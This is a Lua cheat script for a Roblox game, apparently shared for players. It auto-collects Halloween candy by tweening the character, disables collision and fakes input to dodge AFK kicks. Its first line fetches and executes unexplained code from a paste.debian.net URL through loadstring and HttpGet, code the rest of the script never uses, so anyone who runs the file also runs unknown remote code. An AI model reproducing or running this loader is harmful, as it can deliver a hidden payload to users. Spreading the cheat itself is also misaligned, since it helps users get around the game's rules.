--[[
    
    ███╗   ███╗███╗   ███╗██████╗ 
    ████╗ ████║████╗ ████║╚════██╗
    ██╔████╔██║██╔████╔██║ █████╔╝
    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
    🎃 AUT0FARM HALLOWEEN EVENT 2024 🎃
    ]]

loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
wait(0.5)

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- Apply Halloween Theme with darker buttons
WindUI:AddTheme({
    Name = "Halloween",
    Accent = WindUI:Gradient({                                                  
        ["0"] = { Color = Color3.fromHex("#FF7518"), Transparency = 0 },
        ["100"]   = { Color = Color3.fromHex("#8B4513"), Transparency = 0 },
    }, {                                                                        
        Rotation = 0,                                                           
    }),                                                                         
    Dialog = Color3.fromHex("#1A0F00"),
    Outline = Color3.fromHex("#0D0700"),
    Text = Color3.fromHex("#FFFFFF"),
    Placeholder = Color3.fromHex("#7A5C34"),
    Background = Color3.fromHex("#0D0700"),
    Button = Color3.fromHex("#2A1A0A"),
    Icon = Color3.fromHex("#FF9518")
})

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

local visitedPositions = {}
local isActive = false
local flySpeed = 15
local collected = 0
local startTime = 0
local antiAFK = false
local candyName = "Coin_Server" -- Default candy name

-- Safe character handling
player.CharacterAdded:Connect(function(char)
    character = char
    repeat task.wait() until char:FindFirstChild("HumanoidRootPart")
    rootPart = char:WaitForChild("HumanoidRootPart")
    visitedPositions = {}
end)

local collectSound = Instance.new("Sound")
collectSound.SoundId = "rbxassetid://12221967"
collectSound.Volume = 1
collectSound.Parent = rootPart

local Window = WindUI:CreateWindow({
    Title = "Halloween Candy Autofarm",
    Icon = "coins",
    Folder = "AutoFarm",
    Theme = "Halloween",
    Background = "https://tr.rbxcdn.com/180DAY-2d85bbfdad337727a02723d3eac5b51d/768/432/Image/Webp/noFilter"
})

-- Disable topbar buttons
Window:DisableTopbarButtons({
    "Close", 
    "Fullscreen",
})

local Tab = Window:Tab({
    Title = "Auto Farm",
    Icon = "bird"
})
Tab:Select()

local counterLabel = Tab:Button({
    Title = "Candies Collected",
    Desc = "0",
    Locked = true,
    Callback = function() end
})
local timerLabel = Tab:Button({
    Title = "Time Active",
    Desc = "0s",
    Locked = true,
    Callback = function() end
})
local rateLabel = Tab:Button({
    Title = "Est. Candies/Hour",
    Desc = "0",
    Locked = true,
    Callback = function() end
})

-- Candy name configuration
local candyNameInput = Tab:Textbox({
    Title = "Candy Object Name",
    Desc = "Enter the exact name of candy objects",
    Default = "Coin_Server",
    Callback = function(text)
        candyName = text
        visitedPositions = {} -- Reset visited positions when name changes
    end
})

local function findNearestCandy()
    if not rootPart then return nil end
    
    local closestCandy = nil
    local shortestDistance = math.huge
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name == candyName then
            -- Check if object still exists and is valid
            if obj.Parent and obj:IsDescendantOf(workspace) then
                local distance = (obj.Position - rootPart.Position).Magnitude
                if distance < shortestDistance and distance < 250 and not visitedPositions[obj] then
                    closestCandy = obj
                    shortestDistance = distance
                end
            end
        end
    end
    
    return closestCandy
end

local function moveToPosition(targetPosition)
    if not rootPart or not targetPosition then return false end
    
    local distance = (targetPosition - rootPart.Position).Magnitude
    if distance < 5 then return true end -- Already close enough
    
    local duration = distance / flySpeed
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local goal = {CFrame = CFrame.new(targetPosition)}
    
    local success, result = pcall(function()
        local tween = TweenService:Create(rootPart, tweenInfo, goal)
        tween:Play()
        
        local startTime = tick()
        while tween.PlaybackState == Enum.PlaybackState.Playing and (tick() - startTime) < duration + 2 do
            -- Check if we reached destination or if target is gone
            if (rootPart.Position - targetPosition).Magnitude < 10 then
                tween:Cancel()
                return true
            end
            task.wait(0.1)
        end
        return (rootPart.Position - targetPosition).Magnitude < 10
    end)
    
    return success and result
end

autofarmToggle = Tab:Toggle({
    Title = "Auto Farm",
    Desc = "Toggle autofarming",
    Default = false,
    Callback = function(state)
        isActive = state
        print("Autofarm toggle is now:", isActive)
        
        if isActive then
            collected = 0
            startTime = tick()
            visitedPositions = {}

            -- Timer updater
            task.spawn(function()
                while isActive do
                    local elapsed = tick() - startTime
                    timerLabel:SetDesc(string.format("%ds", math.floor(elapsed)))
                    local rate = elapsed > 0 and math.floor((collected / elapsed) * 3600) or 0
                    rateLabel:SetDesc(tostring(rate))
                    task.wait(1)
                end
            end)

            -- Main autofarm loop
            task.spawn(function()
                while isActive do
                    -- Ensure character references are valid
                    if not character or not character.Parent then
                        character = player.Character or player.CharacterAdded:Wait()
                    end
                    if not rootPart or not rootPart.Parent then
                        rootPart = character:WaitForChild("HumanoidRootPart")
                    end
                    
                    local candy = findNearestCandy()
                    
                    if candy then
                        print("Found candy at:", candy.Position)
                        local success = moveToPosition(candy.Position)
                        
                        if success then
                            visitedPositions[candy] = true
                            collected += 1
                            counterLabel:SetDesc(tostring(collected))
                            
                            -- Play collect sound
                            pcall(function()
                                collectSound:Play()
                            end)
                            
                            -- Small delay before next candy
                            task.wait(0.5)
                        else
                            print("Failed to reach candy")
                            visitedPositions[candy] = true -- Mark as visited to avoid getting stuck
                        end
                    else
                        -- No candies found, wait a bit
                        print("No candies found, searching...")
                        task.wait(1)
                    end
                    
                    task.wait(0.1)
                end
            end)
        else
            -- Cleanup when stopping
            visitedPositions = {}
        end
    end
})

Tab:Slider({
    Title = "Fly Speed",
    Desc = "Change flying speed",
    Step = 1,
    Value = {Min = 10, Max = 25, Default = 15},
    Callback = function(val)
        flySpeed = val
    end
})

Tab:Button({
    Title = "Reset Counter",
    Desc = "Resets stats",
    Callback = function()
        collected = 0
        startTime = tick()
        counterLabel:SetDesc("0")
        timerLabel:SetDesc("0s")
        rateLabel:SetDesc("0")
        visitedPositions = {}
    end
})

Tab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents kick for inactivity",
    Default = false,
    Callback = function(state)
        antiAFK = state
    end
})

-- Improved Anti-AFK
player.Idled:Connect(function()
    if antiAFK then
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(0, 0))
    end
end)

-- No collision
RunService.Stepped:Connect(function()
    if isActive and character then
        for _, v in ipairs(character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end
end)

local SettingsTab = Window:Tab({
    Title = "Settings",
    Icon = "settings"
})

local Keybind = SettingsTab:Keybind({
    Title = "Keybind",
    Desc = "Keybind to open ui",
    Value = "G",
    Callback = function(v)
        Window:SetToggleKey(Enum.KeyCode[v])
    end
})

Window:OnToggle(function(isOpen)
    if not isOpen then
        WindUI:Notify({
            Title = "Minimized!",
            Content = "Press G again to open the UI.",
            Duration = 3,
            Icon = "heart",
        })
    end
end)
